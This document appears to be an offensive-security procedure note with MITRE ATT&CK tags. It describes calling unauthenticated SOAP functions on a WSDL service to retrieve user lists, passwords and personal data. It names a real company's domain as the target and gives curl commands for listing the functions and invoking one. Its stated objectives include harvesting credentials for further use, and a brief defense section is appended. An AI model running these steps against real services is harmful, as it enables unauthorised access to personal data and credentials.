---
tags:
  - unauth-access
  - data-exposure
  - webservice
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:48.562Z'
sub_techniques: []
id: 26e81b37-71e7-4849-bd0b-c5b118397c5c
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Access-Test-Data-via-Unauthenticated-Functions

## Summary

This procedure exploits unauthenticated functions in a WSDL service to retrieve test data, including user lists, passwords, and personal information, from a test environment.

## Description

The target WSDL service allows direct calls to functions without authentication checks, exposing sensitive test data. This is common in misconfigured development or test APIs left in production. The procedure assumes access to the service endpoint and uses SOAP requests to invoke functions. Outcomes include data leakage, though limited to test data in this case.

## Requirements

1. Access to the discovered WSDL endpoint
2. SOAP client or browser for function calls
3. Understanding of service operations from WSDL

## Defense

Defensive measures and detection strategies:

- Enforce authentication on all API functions
- Remove or secure test environments from production access
- Log and alert on unauthenticated API calls

## Objectives

1. Retrieve exposed test user data
2. Identify potential credentials for further use
3. Assess data sensitivity despite test nature

## Instructions

### Step 1: Review WSDL for Functions

**Context**: Parse the WSDL to identify callable functions that list data.

**Command** (view WSDL):
```bash
curl http://starbucks.com.cn:nonstandardport/service?wsdl | grep -i function
```

> Output shows function names like getUsers or listData.

### Step 2: Invoke Unauthenticated Function

**Context**: Send a SOAP request to call the function and retrieve data.

**Command** (curl SOAP call example):
```bash
curl -H "Content-Type: text/xml" --data '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><functionName xmlns="http://service.namespace/"></functionName></soap:Body></soap:Envelope>' http://starbucks.com.cn:nonstandardport/service
```

> Expected output: XML response with user lists, passwords, and personal info from test DB.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[unauth-access]]
- [[data-exposure]]
